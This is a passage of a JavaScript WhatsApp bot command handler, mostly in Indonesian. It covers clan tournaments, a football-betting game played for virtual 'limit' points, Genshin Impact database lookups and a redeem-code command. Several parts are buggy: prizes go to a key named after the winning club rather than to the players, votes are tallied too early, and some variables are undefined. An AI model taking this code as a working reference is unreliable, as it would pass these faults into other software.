      let startTournament = clans.tournaments[startTournamentName];

      if (startTournament.status !== "pending")
        return ReplyRynzz("The tournament has already started or ended.");

      if (
        startTournament.participants.length < 2 ||
        startTournament.participants.length % 2 !== 0
      ) {
        return ReplyRynzz(
          "The number of tournament participants must be even and at least 2 clans to start.",
        );
      }

      startTournament.participants =
        startTournament.participants.sort(
          () => Math.random() - 0.5,
        );

      while (startTournament.participants.length > 1) {
        for (
          let i = 0;
          i < startTournament.participants.length;
          i += 2
        ) {
          if (startTournament.participants[i + 1]) {
            startTournament.matches.push({
              clan1: startTournament.participants[i],
              clan2: startTournament.participants[i + 1],
              status: "pending",
            });
          }
        }
        startTournament.participants =
          startTournament.participants.filter(
            (_, index) => index % 2 === 0,
          );
      }

      startTournament.status = "ongoing";
      clans.currentTournament = startTournamentName;
      writeClans(clans);

      await ReplyRynzz(`Tournament ${startTournamentName} has started!`);

      startNextMatch(startTournament);
      break;

    case "status":
if (isBan) return Xban()
await xreaction()
      let statusTournamentName = clans.currentTournament;
      if (!statusTournamentName)
        return ReplyRynzz("No tournament is currently ongoing.");

      let statusTournament =
        clans.tournaments[statusTournamentName];

      let statusText = `*Tournament Status ${statusTournamentName}:*\n\n`;
      statusText += `Status: ${statusTournament.status}\n`;
      statusText += `Participants: ${statusTournament.participants.join(", ")}\n\n`;
      statusText += `Match List:\n`;
      statusTournament.matches.forEach((match, index) => {
        statusText += `${index + 1}. ${match.clan1} vs ${match.clan2} - ${match.status === "completed" ? "Completed" : "Pending"}\n`;
      });

      await ReplyRynzz(statusText.trim());
      break;

    default:
      await ReplyRynzz(
        "Invalid tournament command. Use create, join, start, or status.",
      );
      break;
  }
  break;

default:
  await ReplyRynzz(
    "Unknown command. Please use create, join, approve, war, list, leave, delete, member, missions, task, upgrade, or tournament.",
  );
  break;
}
}

case 'judi':{
if (isBan) return Xban()
await xreaction()
Alice.jbRooms = Alice.jbRooms || {};
  Alice.jbVotes = Alice.jbVotes || {};

  // Daftar klub yang tersedia
  const clubs = [
    "Real Madrid", "Manchester United", "Inter Milan", "Barcelona",
    "Liverpool", "Paris Saint-Germain", "Chelsea", "Juventus",
    "Borussia Dortmund", "Atletico Madrid", "RB Leipzig", "Porto",
    "Arsenal", "Shakhtar Donetsk", "Red Bull Salzburg", "AC Milan",
    "Braga", "PSV Eindhoven", "Lazio", "Red Star Belgrade", "FC Copenhagen"
  ];

  // Fungsi untuk mengacak array
  const shuffleArray = (array) => {
    for (let i = array.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [array[i], array[j]] = [array[j], array[i]];
    }
  };

  // Fungsi untuk menghitung vote
  const countVotes = (votes) => {
    const voteCount = { "1": 0, "2": 0 };
    Object.values(votes).forEach(vote => {
      if (voteCount[vote] !== undefined) {
        voteCount[vote]++;
      }
    });
    return voteCount;
  };

  // Handle perintah tanpa argumen atau dengan argumen 'help'
  if (!args[0] || args[0] === "help") {
    const message = `*❏ JUDI BOLA⚽*

${emojipick}.judi create (buat room) 
${emojipick}.judi join (player join, taruhan 10)
${emojipick}.judi player (daftar pemain yang bergabung)
${emojipick}.judi mulai (mulai game)
${emojipick}.judi vote 1/2 (vote klub pilihan)
${emojipick}.judi delete (hapus sesi room game)

Buatkan sebuah permainan tebak pertandingan bola, contoh: 1 Braga vs 2 Lazio

Untuk pilihan, gunakan ${Xyroo}jb vote 1 atau 2

Minimal player yang bergabung untuk memulai game adalah 2 pemain.

Taruhan: 10 Limit
Hadiah: 200 Limit`;
    await Alice.sendMessage(m.chat, {
      text: message,
      contextInfo: {
        externalAdReply: {
          title: botname,
          body: 'Ayo ikut dan menangkan hadiahnya!',
          thumbnailUrl: 'https://telegra.ph/file/3463760976052aeac5f21.jpg',
          sourceUrl: ``,
          mediaType: 1,
          renderLargerThumbnail: true
        }
      }
    });
    return;
  }

  // Logika berdasarkan argumen pertama
  switch (args[0].toLowerCase()) {
    case 'create':
if (isBan) return Xban()
await xreaction()
      // Logika untuk membuat room
      if (Alice.jbRooms[m.chat]) {
        return ReplyRynzz('Room sudah ada.');
      }
      Alice.jbRooms[m.chat] = {
        players: [],
        gameStarted: false,
        clubs: [],
        limit: 0 // Inisialisasi limit untuk taruhan
      };
      ReplyRynzz('Room berhasil dibuat. Pemain sekarang bisa bergabung.');
      break;

    case 'join':
if (isBan) return Xban()
await xreaction()
      // Logika agar pemain bergabung ke room
      if (!Alice.jbRooms[m.chat]) {
        return ReplyRynzz('Belum ada room yang dibuat. Gunakan .jb create untuk membuat room.');
      }
      if (Alice.jbRooms[m.chat].gameStarted) {
        return ReplyRynzz('Game sudah dimulai. Tidak bisa bergabung sekarang.');
      }
      if (Alice.jbRooms[m.chat].players.find(p => p.id === m.sender)) {
        return ReplyRynzz('Anda sudah bergabung di room.');
      }
      const playerName = m.pushName || Alice.getName(m.sender);
      Alice.jbRooms[m.chat].players.push({ id: m.sender, name: playerName });
      Alice.jbRooms[m.chat].limit += 10; // Tambahkan taruhan ke Limit
      ReplyRynzz(`Anda berhasil bergabung di room. Anda telah memasang taruhan sebesar 10. Total taruhan: ${Alice.jbRooms[m.chat].limit}`);
      break;

    case 'player':
if (isBan) return Xban()
await xreaction()
      // Logika untuk daftar pemain yang bergabung
      if (!Alice.jbRooms[m.chat]) {
        return ReplyRynzz('Belum ada room yang dibuat. Gunakan .jb create untuk membuat room.');
      }
      const players = Alice.jbRooms[m.chat].players;
      ReplyRynzz(`Pemain yang bergabung: \n${players.map(p => `${p.name} (${p.id})`).join('\n')}`);
      break;

    case 'mulai':
if (isBan) return Xban()
await xreaction()
      // Logika untuk memulai game
      if (!Alice.jbRooms[m.chat]) {
        return ReplyRynzz('Belum ada room yang dibuat. Gunakan .jb create untuk membuat room.');
      }
      if (Alice.jbRooms[m.chat].players.length < 2) {
        return ReplyRynzz('Minimal 2 pemain untuk memulai game.');
      }
      shuffleArray(clubs);
      Alice.jbRooms[m.chat].clubs = [clubs[0], clubs[1]];
      Alice.jbRooms[m.chat].gameStarted = true;
      ReplyRynzz(`Game dimulai! Pertandingan: 1 ${clubs[0]} vs 2 ${clubs[1]}. Silakan vote klub pilihan Anda.`);
      break;

    case 'vote':
if (isBan) return Xban()
await xreaction()
      // Logika untuk vote
      if (!Alice.jbRooms[m.chat]) {
        return ReplyRynzz('Belum ada room yang dibuat. Gunakan .jb create untuk membuat room.');
      }
      if (!Alice.jbRooms[m.chat].gameStarted) {
        return ReplyRynzz('Game belum dimulai. Gunakan .jb mulai untuk memulai game.');
      }
      if (!args[1] || !['1', '2'].includes(args[1])) {
        return ReplyRynzz('Pilihan tidak valid. Gunakan .jb vote 1 atau 2.');
      }
      const vote = args[1];
      const currentRoom = Alice.jbRooms[m.chat];
      const player = currentRoom.players.find(p => p.id === m.sender);
      if (!player) {
        return ReplyRynzz('Anda belum bergabung dalam room.');
      }
      Alice.jbVotes[m.sender] = vote;
      ReplyRynzz(`Anda memilih klub nomor ${vote}.`);

      // Cek apakah semua pemain sudah melakukan vote
      const voteCount = countVotes(Alice.jbVotes);
      if (Object.keys(Alice.jbVotes).length === currentRoom.players.length) {
        ReplyRynzz('Semua pemain telah vote. Pertandingan akan segera dimulai...');

        // Jeda 25 detik
        setTimeout(() => {
          ReplyRynzz('Pertandingan telah dimulai. Mohon tunggu sampai pertandingan selesai...');

          // Jeda untuk simulasi pertandingan
          setTimeout(() => {
            // Tentukan pemenang berdasarkan vote terbanyak
            const winnerVote = voteCount["1"] > voteCount["2"] ? "1" : "2";
            const winningClub = currentRoom.clubs[winnerVote - 1];
            const winners = currentRoom.players.filter(player => Alice.jbVotes[player.id] === winnerVote);

            ReplyRynzz(`Pertandingan telah selesai.\nPemenang adalah ${winningClub}.\nPemain yang memilih ${winningClub}:\n${winners.map(w => w.name).join('\n')}\n\nSelamat kepada para pemenang mendapatkan 200.`);            
    let users = global.db.data.users
    // Checking if the user is in the database, if not, initialize their limit to 0
    if (!users[winningClub]) users[winningClub] = { limit: 0 }
    users[winningClub].limit += 200

            // Bersihkan room dan votes setelah pertandingan selesai
            delete Alice.jbRooms[m.chat];
            delete Alice.jbVotes[m.chat];
          }, 25000); // Jeda 25 detik untuk simulasi pertandingan
        }, 25000); // Jeda 25 detik sebelum pertandingan dimulai
      }
      break;

    case 'delete':
if (isBan) return Xban()
await xreaction()
      // Logika untuk menghapus room
      if (!Alice.jbRooms[m.chat]) {
        return ReplyRynzz('Belum ada room yang dibuat.');
      }
      delete Alice.jbRooms[m.chat];
      delete Alice.jbVotes[m.chat];
      ReplyRynzz('Room telah dihapus.');
      break;

    default:
      ReplyRynzz('Perintah tidak dikenal. Gunakan .judi untuk melihat daftar perintah.');
  }
};
break

case 'gens-wildlife':{
if (isBan) return Xban()
await xreaction()
  if (!text) return ReplyRynzz(`Contoh: *${XyrooRynzz} snowboar*\nHarap berikan nama binatang liar.`);
  try {
    let result = await genshindb.wildlife(text);
    if (result) {
      let response = `*Binatang Liar Ditemukan: ${result.name}*\n\n` + `_${result.description || "Data tidak tersedia"}_\n\n` + `*Rarity:* ${result.rarity || "Data tidak tersedia"}\n` + `*Habitat:* ${result.habitat || "Data tidak tersedia"}`;
      ReplyRynzz(response);
    } else {
      ReplyRynzz("Binatang liar tidak ditemukan.");
    }
  } catch (error) {
    console.error(error);
    let available = await genshindb.wildlife("names", {
      matchCategories: true
    });
    ReplyRynzz(`*Tidak Ditemukan*\n\n*Binatang liar yang tersedia:* ${available.join(", ")}`);
  }
};
break
case 'gens-weapons':{
if (isBan) return Xban()
await xreaction()
if (!text) return ReplyRynzz(`Contoh: *${lrefix + command} claymore*\nHarap berikan nama senjata.`);
  try {
    let result = await genshindb.weapons(text);
    if (result) {
      let response = `*Senjata Ditemukan: ${result.name}*\n\n` + `_${result.description || "Data tidak tersedia"}_\n\n` + `*Rarity:* ${result.rarity || "Data tidak tersedia"}\n` + `*Type:* ${result.type || "Data tidak tersedia"}\n` + `*Base ATK:* ${result.baseAttack || "Data tidak tersedia"}\n` + `*Substat:* ${result.subStat || "Data tidak tersedia"}\n` + `*Passive Name:* ${result.passiveName || "Data tidak tersedia"}\n` + `*Passive Description:* ${result.passiveDescription || "Data tidak tersedia"}\n` + (result.refinement ? `\n*Refinement (${result.refinement.refine}):* ${result.refinement.description || "Data tidak tersedia"}\n` : "");
      ReplyRynzz(response);
    } else {
      ReplyRynzz("Senjata tidak ditemukan.");
    }
  } catch (error) {
    console.error(error);
    let available = await genshindb.weapons("names", {
      matchCategories: true
    });
    ReplyRynzz(`*Tidak Ditemukan*\n\n*Senjata yang tersedia:* ${available.join(", ")}`);
  }
};
break
case 'gens-voiceovers':{
if (isBan) return Xban()
await xreaction()
  if (!text) return ReplyRynzz( `Contoh: *${XyrooRynzz} venti*\nHarap berikan nama voiceover.`);
  try {
    let result = await genshindb.voiceovers(text);
    if (result) {
      let response = `*Voiceover Ditemukan: ${result.name}*\n\n`;
      response += `_${result.description || "Deskripsi tidak tersedia"}_\n\n`;
      response += `*Rarity:* ${result.rarity || "Data tidak tersedia"}`;
      ReplyRynzz(response);
    } else {
      ReplyRynzz("Voiceover tidak ditemukan.");
    }
  } catch (error) {
    console.error(error);
    let available = await genshindb.voiceovers("names", {
      matchCategories: true
    });
    ReplyRynzz(`*Tidak Ditemukan*\n\n*Voiceover yang tersedia:* ${available.join(", ")}`);
  }
};
break
case 'gens-viewpoint':{
if (isBan) return Xban()
await xreaction()
  if (!text) return ReplyRynzz(`Contoh: *${XyrooRynzz} starfell valley*\nHarap berikan nama pemandangan.`);
  try {
    let result = await genshindb.viewpoints(text);
    if (result) {
      let response = `*Pemandangan Ditemukan: ${result.name}*\n\n`;
      response += `_${result.description || "Deskripsi tidak tersedia"}_\n\n`;
      response += `*Region:* ${result.region || "Data tidak tersedia"}\n`;
      response += `*Area:* ${result.area || "Data tidak tersedia"}`;
      ReplyRynzz(response);
    } else {
     ReplyRynzz("Pemandangan tidak ditemukan.");
    }
  } catch (error) {
    console.error(error);
    let available = await genshindb.viewpoints("names", {
      matchCategories: true
    });
    ReplyRynzz(`*Tidak Ditemukan*\n\n*Pemandangan yang tersedia:* ${available.join(", ")}`);
  }
};
break
case 'gens-talents':{
if (isBan) return Xban()
await xreaction()
  if (!text) return ReplyRynzz(`Contoh: *${XyrooRynzz} diluc*\nHarap berikan nama karakter untuk mencari bakatnya.`);
  try {
    let result = await genshindb.talents(text);
    if (result && result.length > 0) {
      let response = `*Bakat ditemukan untuk karakter ${text}:*\n\n`;
      result.forEach((talent, index) => {
        response += `*${index + 1}. ${talent.name}*\n`;
        response += `_${talent.description || "Deskripsi tidak tersedia"}_\n\n`;
        response += `*Jenis:* ${talent.type || "Data tidak tersedia"}\n`;
        response += `*Element:* ${talent.element || "Data tidak tersedia"}\n\n`;
      });
      ReplyRynzz(response);
    } else {
     ReplyRynzz(`Bakat untuk karakter '${text}' tidak ditemukan.`);
    }
  } catch (error) {
    console.error(error);
    ReplyRynzz(`*Tidak Ditemukan*\n\n*Bakat untuk karakter '${text}' tidak ditemukan.`);
  }
};
break
case 'gens-potion':{
if (isBan) return Xban()
await xreaction()
  if (!text) return ReplyRynzz(`Contoh: *${XyrooRynzz} squirrel fish*\nHarap berikan nama ramuan atau makanan.`)
  try {
    let result = await genshindb.foods(text);
    if (result) {
      let response = `*Ramuan atau Makanan Ditemukan: ${result.name}*\n\n`;
      response += `_${result.description || "Deskripsi tidak tersedia"}_\n\n`;
      response += `*Rarity:* ${result.rarity || "Data tidak tersedia"}\n`;
      response += `*Efek:* ${result.effect || "Data tidak tersedia"}`;
      ReplyRynzz(response);
    } else {
      ReplyRynzz(`Ramuan atau makanan '${text}' tidak ditemukan.`);
    }
  } catch (error) {
    console.error(error);
    try {
      let availableFoods = await genshindb.foods("names", {
        matchCategories: true
      });
      ReplyRynzz(`*List ${text} foods :*\n\n- ${availableFoods.join("\n- ")}`);
    } catch (error) {
      console.error(error);
      let availableFoods = await genshindb.foods("names", {
        matchCategories: true
      });
      ReplyRynzz(`*Not Found*\n\n*Available foods is :*\n${availableFoods.join(", ")}`);
    }
  }
};
break
case 'gens-outfit':{
if (isBan) return Xban()
await xreaction()
  if (!text) return ReplyRynzz(`Contoh: *${XyrooRynzz} outrider*\nHarap berikan nama kostum atau outfit.`);
  try {
    let result = await genshindb.outfits(text);
    if (result) {
      let response = `*Kostum Ditemukan: ${result.name}*\n\n`;
      response += `_${result.description || "Deskripsi tidak tersedia"}_\n\n`;
      response += `*Karakter:* ${result.character || "Data tidak tersedia"}`;
      if (result.url && result.url.modelviewer) {
        response += `\n_${result.url.modelviewer}_`;
      }
      ReplyRynzz(response);
    } else {
     ReplyRynzz(`Kostum '${text}' tidak ditemukan.`);
    }
  } catch (error) {
    console.error(error);
    try {
      let availableOutfits = await genshindb.outfits(text, {
        matchCategories: true
      });
      ReplyRynzz(`*List ${text} outfit :*\n\n- ${availableOutfits.join("\n- ")}`);
    } catch (error) {
      console.error(error);
      let availableOutfits = await genshindb.outfits("names", {
        matchCategories: true
      });
      ReplyRynzz(`*Not Found*\n\n*Available outfits is:*\n${availableOutfits.join(", ")}`);
    }
  }
};
break
case 'gens-nation':{
if (isBan) return Xban()
await xreaction()
if (!text) return ReplyRynzz(`Contoh: *${XyrooRynzz} mondstadt*\nHarap berikan nama wilayah atau nasionalitas.`);
  try {
    let result = await genshindb.geographies(text);
    if (result) {
      let response = `*Informasi Wilayah Ditemukan: ${result.name}*\n\n`;
      response += `_${result.description || "Deskripsi tidak tersedia"}_\n\n`;
      response += `*Area:* ${result.area || "Data tidak tersedia"}\n`;
      response += `*Region:* ${result.region || "Data tidak tersedia"}`;
      ReplyRynzz(response);
    } else {
      ReplyRynzz("Informasi wilayah tidak ditemukan.");
    }
  } catch (error) {
    console.error(error);
    let available = await genshindb.geographies("names", {
      matchCategories: true
    });
    ReplyRynzz(`*Tidak Ditemukan*\n\n*Wilayah yang tersedia:* ${available.join(", ")}`);
  }
};
break
case 'gens-namacard':{
if (isBan) return Xban()
await xreaction()
  if (!text) return ReplyRynzz(`Contoh: *${XyrooRynzz} anemo flare*\nHarap berikan nama kartu nama.`);
  try {
    let result = await genshindb.namecards(text);
    if (result) {
      let response = `*Kartu Nama Ditemukan: ${result.name}*\n\n`;
      response += `_${result.description || "Deskripsi tidak tersedia"}_\n\n`;
      response += `*Rarity:* ${result.rarity || "Data tidak tersedia"}\n`;
      response += `*Unlock:* ${result.unlock || "Data tidak tersedia"}`;
      ReplyRynzz(response);
    } else {
     ReplyRynzz("Kartu nama tidak ditemukan.");
    }
  } catch (error) {
    console.error(error);
    let available = await genshindb.namecards("names", {
      matchCategories: true
    });
    ReplyRynzz(`*Tidak Ditemukan*\n\n*Kartu nama yang tersedia:* ${available.join(", ")}`);
  }
};
break
case 'gens-materials':{
if (isBan) return Xban()
await xreaction()
  if (!text) return ReplyRynzz(`Contoh: *${XyrooRynzz} boreal wolf's milk*\nHarap berikan nama material.`);
  try {
    let result = await genshindb.materials(text);
    if (result) {
      let response = `*Material Ditemukan: ${result.name}*\n\n`;
      response += `_${result.description || "Deskripsi tidak tersedia"}_\n\n`;
      response += `*Rarity:* ${result.rarity || "Data tidak tersedia"}\n`;
      response += `*Type:* ${result.type || "Data tidak tersedia"}`;
      ReplyRynzz(response);
    } else {
      ReplyRynzz("Material tidak ditemukan.");
    }
  } catch (error) {
    console.error(error);
    let available = await genshindb.materials("names", {
      matchCategories: true
    });
    ReplyRynzz(`*Tidak Ditemukan*\n\n*Material yang tersedia:* ${available.join(", ")}`);
  }
};
break
case 'gens-food':{
if (isBan) return Xban()
await xreaction()
  if (!text) return ReplyRynzz(`Contoh: *${XyrooRynzz} temptation*\nHarap berikan nama makanan.`);
  try {
    let result = await genshindb.foods(text);
    if (result) {
      let response = `*Makanan Ditemukan: ${result.name}*\n\n`;
      response += `_"${result.description}"_\n\n`;
      response += `*Rarity:* ${result.rarity}\n`;
      response += `*Type:* ${result.foodtype}\n`;
      response += `*Category:* ${result.foodfilter} (${result.foodcategory})\n\n`;
      if (result.effect) {
        response += `*Effect:*\n${result.effect}\n\n`;
      }
      if (result.suspicious) {
        response += `*Suspicious:*\n${result.suspicious.effect}\n_"${result.suspicious.description}"_\n\n`;
      }
      if (result.normal) {
        response += `*Normal:*\n${result.normal.effect}\n_"${result.normal.description}"_\n\n`;
      }
      if (result.delicious) {
        response += `*Delicious:*\n${result.delicious.effect}\n_"${result.delicious.description}"_\n\n`;
      }
      ReplyRynzz(response);
    } else {
      ReplyRynzz("Makanan tidak ditemukan.");
    }
  } catch (error) {
    console.error(error);
    let available = await genshindb.foods("names", {
      matchCategories: true
    });
    ReplyRynzz(`*Tidak Ditemukan*\n\n*Makanan yang tersedia:* ${available.join(", ")}`);
  }
};
break
case 'gens-enemy':{
if (isBan) return Xban()
await xreaction()
  if (!text) return ReplyRynzz( `Contoh: *${XyrooRynzz} ruin guard*\nHarap berikan nama musuh.`);
  try {
    let result = await genshindb.enemies(text);
    if (result) {
      let response = `*Musuh Ditemukan: ${result.name}*\n\n`;
      response += `_${result.description || "Deskripsi tidak tersedia"}_\n\n`;
      response += `*Level:* ${result.level || "Data tidak tersedia"}\n`;
      response += `*Rarity:* ${result.rarity || "Data tidak tersedia"}\n`;
      response += `*Element:* ${result.element || "Data tidak tersedia"}`;
      ReplyRynzz(response);
    } else {
      ReplyRynzz("Musuh tidak ditemukan.");
    }
  } catch (error) {
    console.error(error);
    let available = await genshindb.enemies("names", {
      matchCategories: true
    });
    ReplyRynzz(`*Tidak Ditemukan*\n\n*Musuh yang tersedia:* ${available.join(", ")}`);
  }
};
break
case 'gens-emoji':{
if (isBan) return Xban()
await xreaction()
  if (!text) return ReplyRynzz(`Contoh: *${XyrooRynzz} anemo*\nHarap berikan nama emoji.`);
  try {
    let result = await genshindb.emojis(text);
    if (result) {
      let response = `*Emoji Ditemukan: ${result.name}*\n\n`;
      response += `_${result.description}_\n\n`;
      response += `*Rarity:* ${result.rarity || "Data tidak tersedia"}`;
      ReplyRynzz(response);
    } else {
      ReplyRynzz("Emoji tidak ditemukan.");
    }
  } catch (error) {
    console.error(error);
    let available = await genshindb.emojis("names", {
      matchCategories: true
    });
    ReplyRynzz(`*Tidak Ditemukan*\n\n*Emoji yang tersedia:* ${available.join(", ")}`);
  }
};
break
case 'gens-domain':{
if (isBan) return Xban()
await xreaction()
  if (!text) return ReplyRynzz(`Contoh: *${XyrooRynzz} valley of remembrance*\nHarap berikan nama domain.`);
  try {
    let result = await genshindb.domains(text);
    if (result) {
      let response = `*Domain Ditemukan: ${result.name}*\n\n`;
      response += `_${result.description}_\n\n`;
      response += `*Area:* ${result.area || "Data tidak tersedia"}\n`;
      response += `*Level:* ${result.level || "Data tidak tersedia"}`;
      ReplyRynzz(response);
    } else {
      ReplyRynzz("Domain tidak ditemukan.");
    }
  } catch (error) {
    console.error(error);
    let available = await genshindb.domains("names", {
      matchCategories: true
    });
    ReplyRynzz(`*Tidak Ditemukan*\n\n*Domain yang tersedia:* ${available.join(", ")}`);
  }
};
break
case 'gens-craft':{
if (isBan) return Xban()
await xreaction()
  if (!text) return ReplyRynzz(`Contoh: *${XyrooRynzz} mystical enhancement ore*\nHarap berikan nama craft.`);
  try {
    let result = await genshindb.crafts(text);
    if (result) {
      let response = `*Craft Ditemukan: ${result.name}*\n\n`;
      response += `_${result.description}_\n\n`;
      response += `*Type:* ${result.type || "Data tidak tersedia"}\n`;
      response += `*Rarity:* ${result.rarity || "Data tidak tersedia"}`;
      ReplyRynzz(response);
    } else {
      ReplyRynzz("Craft tidak ditemukan.");
    }
  } catch (error) {
    console.error(error);
    let available = await genshindb.crafts("names", {
      matchCategories: true
    });
    ReplyRynzz(`*Tidak Ditemukan*\n\n*Craft yang tersedia:* ${available.join(", ")}`);
  }
};
break
case 'gens-giconstellation':{
if (isBan) return Xban()
await xreaction()
  if (!text) return ReplyRynzz(`Contoh: *${XyrooRynzz} diluc*\nHarap berikan nama karakter untuk mencari konstelasinya.`);
  try {
    let result = await genshindb.constellations(text);
    if (result && result.length > 0) {
      let response = `*Konstelasi ditemukan untuk karakter ${text}:*\n\n`;
      result.forEach((constellation, index) => {
        response += `*${index + 1}. ${constellation.name}*\n`;
        response += `_${constellation.effect}_\n\n`;
        response += `*Unlock At:* C${constellation.unlock || "Data tidak tersedia"}`;
        if (index < result.length - 1) response += "\n\n";
      });
      ReplyRynzz(response);
    } else {
      ReplyRynzz(`Konstelasi untuk karakter '${text}' tidak ditemukan.`);
    }
  } catch (error) {
    console.error(error);
    ReplyRynzz(`*Tidak Ditemukan*\n\n*Konstelasi untuk karakter '${text}' tidak ditemukan.`);
  }
};
break
case 'gens-giartifact':{
if (isBan) return Xban()
await xreaction()
  if (!text) return ReplyRynzz( `Contoh: *${XyrooRynzz} berserker*\nHarap berikan nama artefak.`);
  try {
    let result = await genshindb.artifacts(text);
    if (result) {
      let response = `*Artefak Ditemukan: ${result.name}*\n\n`;
      response += `_${result.description}_\n\n`;
      response += `*Set:* ${result.set || "Data tidak tersedia"}\n`;
      response += `*Rarity:* ${result.rarity || "Data tidak tersedia"}\n`;
      response += `*Slot:* ${result.slot || "Data tidak tersedia"}`;
      ReplyRynzz(response);
    } else {
      ReplyRynzz("Artefak tidak ditemukan.");
    }
  } catch (error) {
    console.error(error);
    let available = await genshindb.artifacts("names", {
      matchCategories: true
    });
    ReplyRynzz(`*Tidak Ditemukan*\n\n*Artefak yang tersedia:* ${available.join(", ")}`);
  }
};
break
case 'gens-area':{
if (isBan) return Xban()
await xreaction()
if (!text) return ReplyRynzz(`Contoh: *${XyrooRynzz} liyue*\nHarap berikan nama tempat.`);
  try {
    let result = await genshindb.geographies(text);
    if (result) {
      let response = `*Info Geografi: ${result.name}*\n\n`;
      response += `_${result.description}_\n\n`;
      response += `*Area:* ${result.area || "Data tidak tersedia"}\n`;
      response += `*Region:* ${result.region || "Data tidak tersedia"}\n`;
      response += `*Urutan Sortir:* ${result.sortorder || "Data tidak tersedia"}`;
      ReplyRynzz(response);
    } else {
      ReplyRynzz("Geografi tidak ditemukan.");
    }
  } catch (error) {
    console.error(error);
    let available = await genshindb.geographies("names", {
      matchCategories: true
    });
    ReplyRynzz(`*Tidak Ditemukan*\n\n*Geografi yang tersedia:* ${available.join(", ")}`);
  }
};
break
case 'gens-animals':{
if (isBan) return Xban()
await xreaction()
  if (!text) return ReplyRynzz( `Contoh: *${XyrooRynzz} shiba*\nHarap berikan nama hewan.`);
  try {
    let animal = await genshindb.animals(text);
    if (animal) {
      let response = `*Hewan Ditemukan: ${animal.name}*\n\n`;
      response += `"${animal.description}"\n\n`;
      response += `*Kategori:* ${animal.category || ""}\n`;
      response += `*Jenis Hitungan:* ${animal.counttype || ""}\n`;
      response += `_${animal.sortorder ? `Urutan Sortir: ${animal.sortorder}` : ""}_`;
      ReplyRynzz(response);
    } else {
      ReplyRynzz("Hewan tidak ditemukan.");
    }
  } catch (error) {
    console.error(error);
    try {
      let animalCategories = await genshindb.animals(text, {
        matchCategories: true
      });
      ReplyRynzz(`*Kategori Hewan ${text} :*\n\n- ${animalCategories.join("\n- ")}`);
    } catch (error) {
      console.error(error);
      let allAnimalNames = await genshindb.animals("names", {
        matchCategories: true
      });
      ReplyRynzz(`*Tidak Ditemukan*\n\n*Hewan yang tersedia:* ${allAnimalNames.join(", ")}`);
    }
  }
};
break
case 'gens-advrank':{
if (isBan) return Xban()
await xreaction()
    if (!text || isNaN(parseInt(text))) {
      return ReplyRynzz(`Masukkan nomor peringkat petualang yang valid. Contoh: *${XyrooRynzz} 5*`);
    }
    try {
    let rankNumber = parseInt(text);
    let result = await genshindb.adventureranks(rankNumber);
    if (result) {
      let response = `*Rank Petualang Ditemukan untuk Rank ${rankNumber}:*\n\n`;
      response += `*Experience:* ${result.exp || "Data tidak tersedia"}\n`;
      response += `*Reward:* ${result.reward || "Data tidak tersedia"}\n`;
      response += `*Deskripsi:* ${result.description || "Data tidak tersedia"}`;
      ReplyRynzz(response);
    } else {
      ReplyRynzz(`Rank petualang untuk Rank ${rankNumber} tidak ditemukan.`);
    }
  } catch (error) {
    console.error(error);
    let availableRanks = await genshindb.adventureranks("names");
    ReplyRynzz(`*Tidak Ditemukan*\n\n*Rank petualang yang tersedia:* ${availableRanks.join(", ")}`);
  }
};
break
case 'gens-giachievement':{
if (isBan) return Xban()
await xreaction()
if (!text) return ReplyRynzz( `Contoh: *${XyrooRynzz} mondstadt*\nHarap berikan nama prestasi.`);
  try {
    let result = await genshindb.achievements(text);
    if (result) {
      let response = `*${result.name}*\n`;
      response += `_${result.description}_\n\n`;
      response += `*Kategori:* ${result.category || ""}\n`;
      response += `*Rarity:* ${result.rarity || ""}\n`;
      response += `*Detail:* ${result.detail || ""}\n`;
      response += `*Cara Mendapatkan:* ${result.howToObtain || ""}\n`;
      ReplyRynzz(response);
    } else {
      ReplyRynzz("Prestasi tidak ditemukan.");
    }
  } catch (error) {
    console.error(error);
    let available = await genshindb.achievements("names", {
      matchCategories: true
    });
    ReplyRynzz(`*Tidak Ditemukan*\n\n*Prestasi yang tersedia:* ${available.join(", ")}`);
  }
};
break

case 'gens-characters':{
if (isBan) return Xban()
await xreaction()
  if (!text) return ReplyRynzz(`Contoh: *${XyrooRynzz} diluc*\nHarap berikan nama karakter.`);
  try {
    let result = await genshindb.characters(text);
    if (result) {
      let response = `*Karakter Ditemukan: ${result.name}*\n\n`;
      response += `_${result.description}_\n\n`;
      response += `*Rarity:* ${result.rarity || "Data tidak tersedia"}\n`;
      response += `*Vision:* ${result.vision || "Data tidak tersedia"}\n`;
      response += `*Senjata:* ${result.weapon || "Data tidak tersedia"}`;
      ReplyRynzz(response);
    } else {
      ReplyRynzz("Karakter tidak ditemukan.");
    }
  } catch (error) {
    console.error(error);
    let available = await genshindb.characters("names", {
      matchCategories: true
    });
    ReplyRynzz(`*Tidak Ditemukan*\n\n*Karakter yang tersedia:* ${available.join(", ")}`);
  }
};
break

//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//————————————————————————//
// Game Fitur Batas!
//————————————————————————//
//🌌——————————————————————————————————————————————————————————————————————————🌌\\

//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//————————————————————————//
// Main Fitur
//————————————————————————//
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
case 'aliceintro' : {
ReplyRynzz(`Haii Memberr Baruu, Sebelum Nimbrung, Intro Dulu Yaa!\n\nNama :\nAsal :\nUmur :\nStatus :\nTempat Tinggal :\n\n${packname}`)
}
break
case 'q':
case 'quoted': {
  if (!m.quoted) return ReplyRynzz('Kutip pesan seseorang!')
  let quo = await Alice.serializeM(await m.getQuotedObj())
  if (!quo.quoted) return ReplyRynzz('Pesan yang kamu reply tidak dikirim oleh bot!')
  await quo.quoted.copyNForward(m.chat, true)
}
break

case "listhadiah":{
if (!isOwner) return Xowner()
if (db.data.settings.hadiah.length < 1) return ReplyRynzz("Tidak ada code hadiah")
var tek = `*乂 LIST CODE HADIAH*\n\nTotal : *${db.data.settings.hadiah.length}*\n\n`
db.data.settings.hadiah.forEach((e) => {
tek += ` ◦ ${e}\n`
})
ReplyRynzz(teks)
}
break

case "redeemcode":{
if (isBan) return Xban()
await xreaction()
if (!args[0]) return ReplyRynzz("Codenya")
if (args[0] !== args[0].toLowerCase()) return ReplyRynzz("*Code Redeem* wajib huruf kecil semua!")
if (db.data.settings.hadiahkadaluwarsa.includes(args[0])) return ReplyRynzz("*Code* tersebut sudah digunakan!")
if (!db.data.settings.hadiah.includes(args[0])) return ReplyRynzz("*Code* tidak valid!")
db.data.settings.hadiahkadaluwarsa.push(args[0])
var code = db.data.settings.hadiah.indexOf(args[0])
db.data.settings.hadiah.splice(code, 1)
